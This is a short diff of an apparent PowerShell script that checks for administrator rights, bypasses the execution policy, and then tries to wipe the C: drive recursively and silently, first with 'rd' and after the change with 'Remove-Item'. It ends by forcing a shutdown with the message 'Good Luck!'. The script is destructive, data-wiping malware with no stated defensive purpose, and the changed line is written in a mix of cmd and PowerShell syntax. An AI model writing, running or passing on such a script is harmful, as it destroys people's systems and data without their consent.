@@ -9,7 +9,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 Set-ExecutionPolicy -ExecutionPolicy Bypass -Force
 
-rd c:\/s /q
+Remove-Item c:\/s /q
 shutdown -s -t 8 -c "Good Luck!" -f
 
 
